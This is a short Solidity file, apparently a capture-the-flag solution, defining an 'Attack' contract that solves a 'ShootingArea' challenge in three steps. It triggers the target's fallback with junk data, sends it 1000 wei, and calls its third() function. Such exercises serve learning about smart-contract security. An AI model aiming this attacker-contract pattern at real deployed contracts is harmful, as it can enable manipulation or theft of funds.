// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.18;

import "./ShootingArea.sol";

contract Attack {
    address payable immutable  target;
    constructor (address payable _target) payable {
        target = _target;
    }
    function step1() external returns (bool) {
        (bool succ,) = target.call("bruh bruh lmao!");
        return succ;
    }
    function step2() external returns (bool) {
        (bool succ,) = target.call{value:1000}("");
        return succ;
    }
    function step3() external returns (bool) {
        ShootingArea(target).third();
        return true;
    }

}
